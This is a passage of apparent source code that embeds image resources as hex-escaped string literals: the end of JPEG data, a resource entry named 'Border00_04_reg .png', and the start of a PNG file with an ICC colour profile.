""\xDC\xC9\x29\xC1\xBD\xB8\x12\x56\x9A\x8E\x85\x85\x04\x2D\xC1\xEB\x59\xAE\x9D\xB2""+ ""\xC1\x5C\x5C\x1B\xDC\x5C\x58\xE2\x25\x04\x96\x42\x7D\xAA\x34\xEE\x37\xC9\xCB\xD9""+ ""\xE2\x2C\xDD\xA8\x4C\x80\x12\xDF\xE4\x37\x8D\x56\xE5\x1E\x59\x77\xEB\x38\x59\x14""+ ""\x30\xC6\xEF\x2A\xED\x74\x99\xE5\x29\xF0\xD8\xD2\x44\x44\xE0\xF0\xAB\x54\x91\x53""+ ""\xC9\xE7\x2E\x9D\x08\xEA\xF4\xAE\x85\x4E\x3F\xCD\x9F\xFC\x5B\xAF\x3B\x54\xF3\x63""+ ""\x3D\x0D\x37\xEE\xCF\x28\x56\x73\x40\x50\x05\x01\x76\x74\x4F\x92\xEC\x3B\xCE\xB3""+ ""\x94\xCE\xEF\x58\xD6\x94\x96\xA4\xEF\x0C\x8C\x85\x22\xA6\x31\x52\x78\x64\x39\x74""+ ""\xAC\xA2\xD8\xD1\xFB\x46\xBA\x44\x6B\xFB\x55\xB2\xDD\x2D\x07\x04\x76\x4A\x0A\x7F""+ ""\x30\x6B\x77\xC2\x65\x7C\xB3\x68\xAA\x3A\xBC\x3F\x9A\x29\x9D\x62\x76\x8B\x0D\xF0""+ ""\x56\x6D\x92\x1A\x70\xFD\xD0\xE8\x29\x1E\xCE\xFC\x54\x76\x6C\xAD\x7C\xD3\x58\x2C""+ ""\xEF\xD3\x3E\x20\xC7\x90\x35\xF3\xA9\x5A\x52\xC2\x63\x0D\xD4\x8D\xF2\xEA\x40\x56""+ ""\x7D\x58\xA9\x95\x56\x3C\xEF\x93\xA8\x4F\x4E\xF6\xE0\x52\x46\xD7\x8C\x2C\xA2\x44""+ ""\x78\xCB\x56\x70\x31\x9C\x9A\x8E\x89\xAC\x75\x6C\x44\xA9\xA2\x59\xE8\x6D\xFF\x00""+ ""\x51\xB3\xBB\x5E\x95\x74\x11\x2D\xF0\x60\xA9\x97\xA4\x4A\x69\x0A\x90\xD2\x77\xD2""+ ""\xD2\x72\x0A\xB3\x9E\x1C\x47\x0F\xCE\xB0\xFA\x8E\xA7\xE1\xA9\x73\x8B\x4D\xF8\xC9""+ ""\x7E\x8F\x43\x1B\x6D\x49\xA7\x8F\xB1\xDE\x1D\x7B\xA4\xC2\xB7\xA4\x5C\xBE\x8C\xB0""+ ""\x4A\x70\xE0\x23\x88\x38\x3C\xB9\xF1\xAB\xA9\xB5\x5D\x05\x28\xFF\x00\xA3\x3D\xBA""+ ""\x6B\x28\x78\x7F\xEC\x13\xAF\xF4\x8B\x88\x57\xF7\x98\x52\x52\xAD\xDF\xF0\x97\xDA""+ ""\xF5\x8E\x1C\x45\x6A\x8D\x56\x4B\x74\xB2\x63\x96\x22\xFE\x6D\x89\x38\xB7\xDB\x04""+ ""\xA4\x83\x16\xE7\x0D\x7B\xC3\x20\x05\x8C\xFB\xAB\x87\x19\xC7\x94\x4A\xC3\xE1\x83""+ ""\x97\x8B\x4A\x54\x52\x2E\x11\xB2\x00\x24\x75\xA9\xE0\x3D\xF4\x4E\x5E\x08\x70\x44""+ ""\x67\xF4\x92\xCB\x21\xE7\x58\x62\xE3\x15\x6E\x36\x70\xA0\x1C\x1C\x3E\x3F\x95\x77""+ ""\x89\xA5\x96\x8E\x31\x17\xC3\x3C\xF9\xD3\xAD\xC4\xBB\xA5\x74\x2A\xD2\x41\x05\xD9""+ ""\xF8\x20\xFA\xDB\xAC\x76\xBC\xC8\xD9\x4A\xC4\x4F\x27\xD5\x65\xA1\x40\x14\x05\xBF""+ ""\xD1\xA5\x4B\x6D\xDD\x78\xB4\x7D\xA1\xA4\x26\x11\xFA\xCD\xD7\x32\x6D\x26\xD1\x29""+ ""\x65\xE1\x8C\xE5\x6A\x0B\x83\xC9\x4D\xB1\x86\xF2\x1B\x1B\xEE\xAD\x27\x81\x18\x04""+ ""\x7E\x62\xB3\x4A\xFB\x2C\x86\x67\x2D\x9F\xB1\x6F\x45\x71\xDA\x31\xDF\xC8\xF9\xDD""+ ""\x5E\xB6\xE2\xC2\x41\x56\x0A\x52\x70\xA2\x79\x9E\x38\xF7\x72\xAE\x2C\x95\xB7\x57""+ ""\xDA\x97\x08\xEA\x0A\x15\xCB\xB8\xB9\x63\x9D\x37\xAC\x2E\x32\xAE\xC6\x0B\x0D\x25""+ ""\x48\x23\x8A\x94\x9C\x92\xA0\x0F\x0F\x57\x7D\x4C\x25\x7E\x9A\x3D\x55\xBD\xFC\x12""+ ""\xE3\x56\xA2\xCC\x49\x6C\x75\x31\xE4\x5B\xAE\x26\x4B\x8E\x8F\xD2\xC7\x73\x75\xF4""+ ""\x9E\x21\xB5\x1E\x01\x23\xDD\x59\x35\x9A\xAB\xEE\x92\x73\x7C\xF1\x83\xD8\xF4\xFD""+ ""\x35\x15\x41\xA8\xF2\xB9\x2D\x7D\x8B\xB3\x10\x59\xA6\x85\x34\x95\x21\x72\x92\x51""+ ""\x94\x77\xEE\x8A\xF9\x2F\x58\x9B\x56\x47\xEC\x7B\xFA\x7C\x28\xBC\x14\xF6\xA7\x71""+ ""\x48\x5B\x53\xDB\x75\x3B\xED\x48\x94\xD2\xDA\x6F\xB4\xB0\x43\xA4\x82\xAC\x8E\x1C""+ ""\x38\x0F\x65\x7D\x1E\x8E\xC8\xEF\x16\xB9\x4B\xFB\x1E\x35\xF5\xDA\xD2\x9E\x78\x6F""+ ""\xFB\x8B\xE9\x65\xDC\x2F\x53\x30\xE3\xB3\xD9\x42\xDB\x53\x80\x36\xD7\x12\x40\xC8""+ ""\x18\x00\x01\x9F\x3D\x5D\x3D\x5C\x74\x71\x7D\x2F\x1F\x92\x21\xA5\xB7\x56\xD7\x5A""+ ""\xCF\xE3\xFF\x00\x06\xD7\x2B\x9D\xCA\x0C\xB5\x31\x21\x89\xCC\x91\xC4\x07\x54\xA0""+ ""\x48\xF3\x8C\x0E\x55\xB6\xAD\x4A\xBE\x3D\x50\x9E\x57\xDC\xC1\x75\x12\xA2\x5D\x32""+ ""\x8E\x3F\x07\x4D\xB3\xFB\xBC\x48\xB6\x6B\xDC\xD9\x76\xD4\xBE\xE3\x7B\x8B\x49\x79""+ ""\x47\x04\x04\x9C\x8E\x3D\xF5\xE3\x7A\xA2\xBA\xCB\xAA\x84\x26\xE3\x9C\xF0\x7A\xDE""+ ""\x99\xDB\x8D\x36\xCE\x51\x4F\x1E\x46\x31\xF6\xAB\xA4\x14\xDC\xFF\x00\xA7\x69\x74""+ ""\xA5\xE6\x1D\x40\x47\x56\xF6\x02\xC1\x3C\x78\x1E\x40\x55\x92\xD1\x6B\xEB\xC2\xAE""+ ""\xF9\x19\xFF\x00\x48\x68\xE7\x97\x65\x4B\x6F\xE0\x86\x3D\x2A\xE7\x5B\x6E\x3B\x32""+ ""\xD9\xEC\xAB\x4B\x7B\x91\x56\xF5\xC7\x75\x3B\xDB\xDF\x79\xBE\xFA\xF5\xFD\x3A\x57""+ ""\xCA\x84\xF5\x0F\x32\xDC\xF2\x7D\x4A\x14\xC7\x50\xD5\x3F\xB3\xB1\xE6\xEA\xDA\x60""+ ""\x0A\x00\xA0\x2D\xFE\x8D\x85\x40\xEB\xE2\x9C\xEF\x0D\x1D\x34\x8F\x6E\xF2\x2B\x99""+ ""\xED\x17\x93\xA8\xF3\xB1\x06\xEB\xC8\x85\x6F\x4C\x80\xF2\xC3\x8E\xAB\x0B\x4E\x33""+ ""\xC3\x18\x38\x3E\xCA\xF3\xE0\x95\x92\xE9\x6B\x83\x44\x97\x44\x33\x9E\x4B\x33\x60""+ ""\x7A\x7E\xC5\x78\xB7\xDD\x64\x5D\xA2\xA6\x4C\x56\x1C\x53\x69\x52\xB7\x4E\x1B\x28""+ ""\x2A\x39\xC8\xCF\xBB\xCD\x5E\x3F\xAD\xEA\xED\xD3\x4A\x2A\xB7\x86\xFF\x00\xEC\xFA""+ ""\x1F\x44\xD1\xD3\x6D\x16\x4E\x6B\x29\x6D\xBF\x81\x3D\x59\xA7\xED\x31\x5F\x96\xAB""+ ""\x13\x4E\x3F\x1C\x36\x95\xB4\xEA\x56\x14\x97\x09\x07\x97\x9F\x07\xF8\xD7\xA5\xA2""+ ""\xD5\x59\x65\x69\xDA\xF0\xCC\x3A\xDD\x2D\x55\xCD\xF6\x56\x57\xB1\x0D\xB3\x28\x33""+ ""\x53\x65\xBB\x3A\xBD\xE6\xBE\x91\x21\x24\x2D\x2A\xCE\x70\x08\x50\xE0\x79\xF1\x14""+ ""\xF5\x09\xA5\x28\xE3\xD8\xB7\xD2\x2A\x73\x8C\x93\x78\xCB\x2D\xED\x0B\xA9\x91\xA7""+ ""\x74\xDD\xC2\x44\xA7\x1C\x58\x8E\xB6\xDC\x75\x65\x20\xE5\x3C\xB7\x78\x9E\x75\xF2""+ ""\xDE\xA3\xA7\x9E\xA2\xE8\x46\x2B\x9C\x9F\x47\x5C\x61\x55\x6E\x56\x3D\x91\x50\xBF""+ ""\x75\x4D\xC2\x64\xD2\xF3\xAE\x36\x5F\x90\xA7\x5B\x4A\x94\x51\xC0\xA8\x9C\xE0\x73""+ ""\x3C\x6B\xDF\xAA\xB5\x05\x1C\x2E\x16\x0F\x06\x5A\xD5\x25\x28\xCB\xCE\xC6\xFA\x62""+ ""\xE3\x78\xB3\x5D\x9B\x16\xA9\xEC\xA5\xC7\x5F\xDC\x71\x4F\x00\xB2\x13\x8C\x77\xF0""+ ""\x03\xF2\xAE\xF5\x35\xD1\x7D\x6D\xCD\x70\xB6\x2A\xD3\x6A\x2C\xAE\x6A\x31\x96\xCD""+ ""\xEE\x4F\x6A\xEC\x5D\xDF\xB7\x8B\xD5\xF2\x23\x81\xA6\x90\xD2\x7A\x96\x89\x56\xF1""+ ""\x1C\x41\x50\x1E\xDF\x65\x62\xD2\x4F\xE1\x94\xBB\x70\xC6\x59\xEA\x6A\xA8\xA6\xEE""+ ""\x97\x64\xF6\xFF\x00\x93\x98\x9F\x62\xBB\xC5\x5C\x98\xF1\x16\xD3\x91\x3A\xC2\x50""+ ""\x85\xAB\x2A\x4A\x4F\x2E\x3C\xB3\x5E\xDE\x9E\xE5\x6C\x54\x9A\x3C\x0D\x56\x9A\x54""+ ""\xCD\xC5\x35\x81\x7D\x32\xA6\x60\xD8\xD4\xB9\x56\xC6\x24\x4A\x62\x56\xF1\xDE\x48""+ ""\xE2\x38\x70\xFD\x94\xBE\xB9\x4D\xEC\xF1\x94\x46\x9A\xC8\xD7\x0F\x99\x65\xE4\x75""+ ""\xD2\x22\x53\x73\xF6\x59\xA2\x67\x32\xC0\x61\xA9\x17\x3B\xBB\x8D\xB6\x00\x1B\xA9""+ ""\x2E\x23\x03\x03\x95\x68\xD1\xD6\xEB\xA6\x30\x6F\x2D\x23\x0E\xAE\x6A\xCB\xA5\x24""+ ""\xB6\x6C\xA0\xAB\x49\x9C\x28\x02\x80\xB6\xBA\x3A\x28\xA1\x9D\xA0\xA8\x73\x1A\x3A""+ ""\x6F\xFF\x00\x4D\xD4\x49\x65\x12\x9E\x1E\x4E\x65\xB9\x90\xE6\x84\xA2\x72\x1D\x0D""+ ""\x36\x9E\xD7\x56\xA3\x9F\xD9\x58\x1D\x73\xAF\x78\x3D\xD9\x73\xB5\x4F\x0A\x4B\x83""+ ""\xBD\xD1\x77\x89\x76\x3B\x5C\xBB\x6D\xA9\xD4\x33\x16\x76\x1C\x75\x2A\x51\x2B\x00""+ ""\xA4\xA7\x74\x2B\x1D\xE2\xBC\x9D\x62\x8D\xCD\x4A\xD5\x96\xBF\xCE\x0F\x4F\x49\xAB""+ ""\xB2\x8A\xE5\x5D\x7B\x29\x6E\xC6\x32\x2E\xB3\x18\xB8\x39\x15\x85\x2D\xFC\x28\x25""+ ""\xA4\x25\x47\x0D\xA4\xA7\x9E\x05\x59\x18\x29\xD4\xA5\x37\x82\xA9\xD9\x25\x2F\x26""+ ""\xDA\x7A\xE7\x3A\xCD\xA6\x5D\x8E\xC8\x48\x48\x79\x6F\x15\x3A\x32\x5C\x27\x03\x03""+ ""\x1E\xB1\x5D\x5F\x67\x76\xE4\xBF\xC4\x34\xFA\x89\xD3\x56\x23\xE4\x52\xED\x7A\x7E""+ ""\x7D\xAD\xD8\x65\xD4\x19\x07\x71\x45\xB6\xD5\xC3\x19\xE5\xED\xA4\x13\x8C\xD4\x9A""+ ""\xDB\x7D\xCB\x65\xAC\x9C\xEB\x70\x6C\x82\x9D\xD5\xC8\x61\x97\x9B\x74\xB4\xA6\xC1""+ ""\x09\x46\xF1\xDF\xDE\xEF\x04\xD5\xD5\xE6\x12\x69\xAC\xE7\xF9\x18\xAD\xB3\xAD\x2C""+ ""\x6D\x83\x09\x12\xAD\xD3\x42\xFA\xB3\xBA\xA4\xF6\x9C\x52\xF7\xF7\x88\x1C\xC5\x4F""+ ""\x54\x6D\x8E\x1B\x39\x8F\x55\x72\xCE\x07\x51\x2F\x0A\x54\x64\xF6\xD8\x7D\xC5\xE0""+ ""\x60\x76\x70\xAC\x64\xF1\xEE\x35\x55\x94\x6E\xFD\x91\xA6\x3A\xB9\xA8\x6C\x35\x97""+ ""\x79\x9C\xE4\x17\x07\x56\xF0\x29\x48\xCA\xCA\x7E\xC9\xFE\x7D\xDE\xFA\xD1\x5D\x6A""+ ""\x12\x58\x91\x9E\xDD\x4D\x93\x4F\x24\x44\x4B\xF5\xD5\x88\x12\x1B\xEB\x73\x1D\x67""+ ""\x0A\x38\xCA\xB8\xF0\xE7\xDC\x2B\x6B\x49\xB4\xBD\xCC\xEA\xD9\xE3\x07\x5D\xB4\xF5""+ ""\x97\x3A\x3E\x6C\xD9\x44\xA8\x93\x32\xED\x92\xAE\x67\xF4\x88\xAB\xA0\xB0\x8A\xCA""+ ""\x76\xBB\x01\x40\x14\x05\xC9\xD1\x7E\xDB\x3A\xF3\x3F\x5B\x5A\x2D\x91\xD7\x26\x74""+ ""\xCD\x27\x31\x98\xEC\xA0\x80\xA7\x16\x54\x8C\x24\x67\xBE\xA1\xF0\x09\x58\x5B\x0F""+ ""\xDA\xAB\x19\x43\x7A\x0E\xF0\xD8\x18\x51\x51\x08\x25\x47\xF5\xAB\x14\xEB\xB2\x5B""+ ""\xB2\xD4\xE2\xB6\x44\xF4\xAD\x92\x6D\x48\xDB\xD5\x1D\x8D\x1B\x76\x4B\x8E\xA3\xAB""+ ""\x5A\x94\xDA\x14\x07\xFA\xBE\xD6\x73\xC4\xE2\xBC\xF8\x68\xEC\xEE\x75\x4A\x3B\x2D""+ ""\xCD\x2E\xE8\xA8\xE1\x3D\xC6\xF6\x7D\x8C\xED\x4A\x04\x15\x34\xEE\x8D\xBA\xB9\xBF""+ ""\xDA\x51\xDD\x41\x56\xF7\x71\x1D\xAC\xD5\xB7\xE9\xEC\xB6\x6A\x49\x63\x05\x75\xCE""+ ""\x30\x58\x6C\xD7\xFA\xA3\xDA\xD8\x8C\xE4\x47\xB4\x35\xC9\xD5\x21\x2A\x53\x2E\xE1""+ ""\x24\x67\x1D\x9F\xBD\xCE\xA7\xE0\xDF\x52\x9A\x58\xF2\x8E\xA3\x77\x4E\x53\x7F\x62""+ ""\x32\xDB\xB1\x6D\xAE\x46\x68\x97\x74\x35\xE9\x4F\xAD\x7B\xC5\x63\x73\x80\xF3\x1E""+ ""\xD5\x6A\xB6\x87\x37\xB2\xD8\xAA\x16\x28\xAD\xF9\x33\x7A\xD8\x8E\xD7\x5F\x59\x76""+ ""\x36\x87\xB8\x04\xE7\x25\x20\x27\x24\xF7\x9F\xB5\x4A\x2A\x71\xDA\x49\x8B\xA6\xA4""+ ""\xF2\x8D\xCE\xC6\xB6\xAE\x5A\x40\x77\x42\x5D\x9F\x3B\x84\x6E\xEE\x25\x21\x07\xF5""+ ""\xBB\xEB\x9F\x87\x96\x5E\x36\x27\xBA\xB1\xBE\xE3\x1B\x7E\xC1\x76\xAC\x24\x61\xCD""+ ""\x0B\x76\x69\x0A\x39\x39\x09\x20\x7E\xF5\x5F\x62\x92\x8E\xCB\x2C\xA1\x6E\xF7\x25""+ ""\x66\xEC\x57\x6A\xC8\x5C\x51\x17\x45\x5D\xD6\xC3\x44\x05\x24\x94\xE5\x47\x3C\xC8""+ ""\x2A\xE5\x59\x2B\xA6\x6D\x4B\xAD\x6E\xCB\xA5\x24\xB1\xD2\xF8\x1B\x6A\x7D\x8C\x6D""+ ""\x5E\x62\x56\x88\xBB\x3F\xBC\x12\xA2\x37\x94\x50\x8C\xF3\xCF\x0E\xD7\x2A\xEF\x49""+ ""\xA7\xB2\xBD\xE6\x2D\x9C\x65\xC0\xD7\x6E\x1A\x7E\xF9\xA5\xB6\x29\xB3\xBB\x26\xA3""+ ""\xB7\x3F\x6E\xB9\x33\x26\xE6\xB7\x23\xBC\x46\xFA\x52\xA7\x10\x52\x78\x13\xC0\x81""+ ""\x5E\x82\x58\x28\x28\xDA\x90\x14\x01\x40\x2F\x16\x54\x88\xAE\x17\x23\x3E\xEB\x2B""+ ""\x23\x1B\xCD\xAC\xA4\xE3\xDA\x28\x07\x3E\x5A\xBB\x7A\x4A\x6F\x88\x5F\xC6\x80\x3C""+ ""\xB5\x76\xF4\x94\xDF\x10\xBF\x8D\x00\x79\x6A\xED\xE9\x29\xBE\x21\x7F\x1A\x00\xF2""+ ""\xD5\xDB\xD2\x53\x7C\x42\xFE\x34\x01\xE5\xAB\xB7\xA4\xA6\xF8\x85\xFC\x68\x03\xCB""+ ""\x57\x6F\x49\x4D\xF1\x0B\xF8\xD0\x07\x96\xAE\xDE\x92\x9B\xE2\x17\xF1\xA0\x0F\x2D""+ ""\x5D\xBD\x25\x37\xC4\x2F\xE3\x40\x1E\x5A\xBB\x7A\x4A\x6F\x88\x5F\xC6\x80\x3C\xB5""+ ""\x76\xF4\x94\xDF\x10\xBF\x8D\x00\x84\xA9\xB2\xE5\xEE\xFD\x2A\x4B\xCF\x6E\xFD\x9E""+ ""\xB1\xC2\xAC\x7B\xCD\x00\xDA\x80\x28\x02\x80\xCE\x28\x0C\x50\x05\x00\x50\x05\x00""+ ""\x50\x05\x00\x50\x05\x00\x50\x05\x01\x9C\x1A\x03\x14\x01\x40\x00\xFF\xD9\x72\x65""+ ""\x73\x6F\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1A\x00\x00\x01\x42\x6F\x72\x64\x65""+ ""\x72\x30\x30\x5F\x30\x34\x5F\x72\x65\x67\x20\x2E\x70\x6E\x67\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x89\x50\x4E\x47\x0D""+ ""\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52\x00\x00\x06\x40\x00\x00\x04\xB0\x08""+ ""\x03\x00\x00\x00\x94\xDF\x76\xA5\x00\x00\x00\x09\x70\x48\x59\x73\x00\x00\x33\x43""+ ""\x00\x00\x2E\x23\x01\x76\x58\xCD\x22\x00\x00\x0A\x4F\x69\x43\x43\x50\x50\x68\x6F""+ ""\x74\x6F\x73\x68\x6F\x70\x20\x49\x43\x43\x20\x70\x72\x6F\x66\x69\x6C\x65\x00\x00""+ ""\x78\xDA\x9D\x53\x67\x54\x53\xE9\x16\x3D\xF7\xDE\xF4\x42\x4B\x88\x80\x94\x4B\x6F""+ ""\x52\x15\x08\x20\x52\x42\x8B\x80\x14\x91\x26\x2A\x21\x09\x10\x4A\x88\x21\xA1\xD9""+ ""\x15\x51\xC1\x11\x45\x45\x04\x1B\xC8\xA0\x88\x03\x8E\x8E\x80\x8C\x15\x51\x2C\x0C""+ ""\x8A\x0A\xD8\x07\xE4\x21\xA2\x8E\x83\xA3\x88\x8A\xCA\xFB\xE1\x7B\xA3\x6B\xD6\xBC""+ ""\xF7\xE6\xCD\xFE\xB5\xD7\x3E\xE7\xAC\xF3\x9D\xB3\xCF\x07\xC0\x08\x0C\x96\x48\x33""+ ""\x51\x35\x80\x0C\xA9\x42\x1E\x11\xE0\x83\xC7\xC4\xC6\xE1\xE4\x2E\x40\x81\x0A\x24""+ ""\x70\x00\x10\x08\xB3\x64\x21\x73\xFD\x23\x01\x00\xF8\x7E\x3C\x3C\x2B\x22\xC0\x07""+ ""\xBE\x00\x01\x78\xD3\x0B\x08\x00\xC0\x4D\x9B\xC0\x30\x1C\x87\xFF\x0F\xEA\x42\x99""+ ""\x5C\x01\x80\x84\x01\xC0\x74\x91\x38\x4B\x08\x80\x14\x00\x40\x7A\x8E\x42\xA6\x00""+ ""\x40\x46\x01\x80\x9D\x98\x26\x53\x00\xA0\x04\x00\x60\xCB\x63\x62\xE3\x00\x50\x2D""+ ""\x00\x60\x27\x7F\xE6\xD3\x00\x80\x9D\xF8\x99\x7B\x01\x00\x5B\x94\x21\x15\x01\xA0""+ ""\x91\x00\x20\x13\x65\x88\x44\x00\x68\x3B\x00\xAC\xCF\x56\x8A\x45\x00\x58\x30\x00""+ ""\x14\x66\x4B\xC4\x39\x00\xD8\x2D\x00\x30\x49\x57\x66\x48\x00\xB0\xB7\x00\xC0\xCE""+ ""\x10\x0B\xB2\x00\x08\x0C\x00\x30\x51\x88\x85\x29\x00\x04\x7B\x00\x60\xC8\x23\x23""+ ""\x78\x00\x84\x99\x00\x14\x46\xF2\x57\x3C\xF1\x2B\xAE\x10\xE7\x2A\x00\x00\x78\x99""+ ""\xB2\x3C\xB9\x24\x39\x45\x81\x5B\x08\x2D\x71\x07\x57\x57\x2E\x1E\x28\xCE\x49\x17""+ ""\x2B\x14\x36\x61\x02\x61\x9A\x40\x2E\xC2\x79\x99\x19\x32\x81\x34\x0F\xE0\xF3\xCC""+ ""\x00\x00\xA0\x91\x15\x11\xE0\x83\xF3\xFD\x78\xCE\x0E\xAE\xCE\xCE\x36\x8E\xB6\x0E""+ ""\x5F\x2D\xEA\xBF\x06\xFF\x22\x62\x62\xE3\xFE\xE5\xCF\xAB\x70\x40\x00\x00\xE1\x74""+ ""\x7E\xD1\xFE\x2C\x2F\xB3\x1A\x80\x3B\x06\x80\x6D\xFE\xA2\x25\xEE\x04\x68\x5E\x0B""+ ""\xA0\x75\xF7\x8B\x66\xB2\x0F\x40\xB5\x00\xA0\xE9\xDA\x57\xF3\x70\xF8\x7E\x3C\x3C""+ ""\x45\xA1\x90\xB9\xD9\xD9\xE5\xE4\xE4\xD8\x4A\xC4\x42\x5B\x61\xCA\x57\x7D\xFE\x67""+ ""\xC2\x5F\xC0\x57\xFD\x6C\xF9\x7E\x3C\xFC\xF7\xF5\xE0\xBE\xE2\x24\x81\x32\x5D\x81""+ ""\x47\x04\xF8\xE0\xC2\xCC\xF4\x4C\xA5\x1C\xCF\x92\x09\x84\x62\xDC\xE6\x8F\x47\xFC""+ ""\xB7\x0B\xFF\xFC\x1D\xD3\x22\xC4\x49\x62\xB9\x58\x2A\x14\xE3\x51\x12\x71\x8E\x44""+ ""\x9A\x8C\xF3\x32\xA5\x22\x89\x42\x92\x29\xC5\x25\xD2\xFF\x64\xE2\xDF\x2C\xFB\x03""+ ""\x3E\xDF\x35\x00\xB0\x6A\x3E\x01\x7B\x91\x2D\xA8\x5D\x63\x03\xF6\x4B\x27\x10\x58""+ ""\x74\xC0\xE2\xF7\x00\x00\xF2\xBB\x6F\xC1\xD4\x28\x08\x03\x80\x68\x83\xE1\xCF\x77""+ ""\xFF\xEF\x3F\xFD\x47\xA0\x25\x00\x80\x66\x49\x92\x71\x00\x00\x5E\x44\x24\x2E\x54""+ ""\xCA\xB3\x3F\xC7\x08\x00\x00\x44\xA0\x81\x2A\xB0\x41\x1B\xF4\xC1\x18\x2C\xC0\x06""+ ""\x1C\xC1\x05\xDC\xC1\x0B\xFC\x60\x36\x84\x42\x24\xC4\xC2\x42\x10\x42\x0A\x64\x80""+ ""\x1C\x72\x60\x29\xAC\x82\x42\x28\x86\xCD\xB0\x1D\x2A\x60\x2F\xD4\x40\x1D\x34\xC0""+ ""\x51\x68\x86\x93\x70\x0E\x2E\xC2\x55\xB8\x0E\x3D\x70\x0F\xFA\x61\x08\x9E\xC1\x28""+ ""\xBC\x81\x09\x04\x41\xC8\x08\x13\x61\x21\xDA\x88\x01\x62\x8A\x58\x23\x8E\x08\x17""+ ""\x99\x85\xF8\x21\xC1\x48\x04\x12\x8B\x24\x20\xC9\x88\x14\x51\x22\x4B\x91\x35\x48""+ ""\x31\x52\x8A\x54\x20\x55\x48\x1D\xF2\x3D\x72\x02\x39\x87\x5C\x46\xBA\x91\x3B\xC8""+ ""\x00\x32\x82\xFC\x86\xBC\x47\x31\x94\x81\xB2\x51\x3D\xD4\x0C\xB5\x43\xB9\xA8\x37""+ ""\x1A\x84\x46\xA2\x0B\xD0\x64\x74\x31\x9A\x8F\x16\xA0\x9B\xD0\x72\xB4\x1A\x3D\x8C""+ ""\x36\xA1\xE7\xD0\xAB\x68\x0F\xDA\x8F\x3E\x43\xC7\x30\xC0\xE8\x18\x07\x33\xC4\x6C""+ ""\x30\x2E\xC6\xC3\x42\xB1\x38\x2C\x09\x93\x63\xCB\xB1\x22\xAC\x0C\xAB\xC6\x1A\xB0""+ ""\x56\xAC\x03\xBB\x89\xF5\x63\xCF\xB1\x77\x04\x12\x81\x45\xC0\x09\x36\x04\x77\x42""+ ""\x20\x61\x1E\x41\x48\x58\x4C\x58\x4E\xD8\x48\xA8\x20\x1C\x24\x34\x11\xDA\x09\x37""+ ""\x09\x03\x84\x51\xC2\x27\x22\x93\xA8\x4B\xB4\x26\xBA\x11\xF9\xC4\x18\x62\x32\x31""+ ""\x87\x58\x48\x2C\x23\xD6\x12\x8F\x13\x2F\x10\x7B\x88\x43\xC4\x37\x24\x12\x89\x43""+ ""\x32\x27\xB9\x90\x02\x49\xB1\xA4\x54\xD2\x12\xD2\x46\xD2\x6E\x52\x23\xE9\x2C\xA9""+ ""\x9B\x34\x48\x1A\x23\x93\xC9\xDA\x64\x6B\xB2\x07\x39\x94\x2C\x20\x2B\xC8\x85\xE4""+ ""\x9D\xE4\xC3\xE4\x33\xE4\x1B\xE4\x21\xF2\x5B\x0A\x9D\x62\x40\x71\xA4\xF8\x53\xE2""+ ""\x28\x52\xCA\x6A\x4A\x19\xE5\x10\xE5\x34\xE5\x06\x65\x98\x32\x41\x55\xA3\x9A\x52""+ ""\xDD\xA8\xA1\x54\x11\x35\x8F\x5A\x42\xAD\xA1\xB6\x52\xAF\x51\x87\xA8\x13\x34\x75""+ ""\x9A\x39\xCD\x83\x16\x49\x4B\xA5\xAD\xA2\x95\xD3\x1A\x68\x17\x68\xF7\x69\xAF\xE8""+ ""\x74\xBA\x11\xDD\x95\x1E\x4E\x97\xD0\x57\xD2\xCB\xE9\x47\xE8\x97\xE8\x03\xF4\x77""+ ""\x0C\x0D\x86\x15\x83\xC7\x88\x67\x28\x19\x9B\x18\x07\x18\x67\x19\x77\x18\xAF\x98""+ ""\x4C\xA6\x19\xD3\x8B\x19\xC7\x54\x30\x37\x31\xEB\x98\xE7\x99\x0F\x99\x6F\x55\x58""+ ""\x2A\xB6\x2A\x7C\x15\x91\xCA\x0A\x95\x4A\x95\x26\x95\x1B\x2A\x2F\x54\xA9\xAA\xA6""+ ""\xAA\xDE\xAA\x0B\x55\xF3\x55\xCB\x54\x8F\xA9\x5E\x53\x7D\xAE\x46\x55\x33\x53\xE3""+ ""\xA9\x09\xD4\x96\xAB\x55\xAA\x9D\x50\xEB\x53\x1B\x53\x67\xA9\x3B\xA8\x87\xAA\x67""+ ""\xA8\x6F\x54\x3F\xA4\x7E\x59\xFD\x89\x06\x59\xC3\x4C\xC3\x4F\x43\xA4\x51\xA0\xB1""+ ""\x5F\xE3\xBC\xC6\x20\x0B\x63\x19\xB3\x78\x2C\x21\x6B\x0D\xAB\x86\x75\x81\x35\xC4""+ ""\x26\xB1\xCD\xD9\x7C\x76\x2A\xBB\x98\xFD\x1D\xBB\x8B\x3D\xAA\xA9\xA1\x39\x43\x33""+ ""\x4A\x33\x57\xB3\x52\xF3\x94\x66\x3F\x07\xE3\x98\x71\xF8\x9C\x74\x4E\x09\xE7\x28""+ 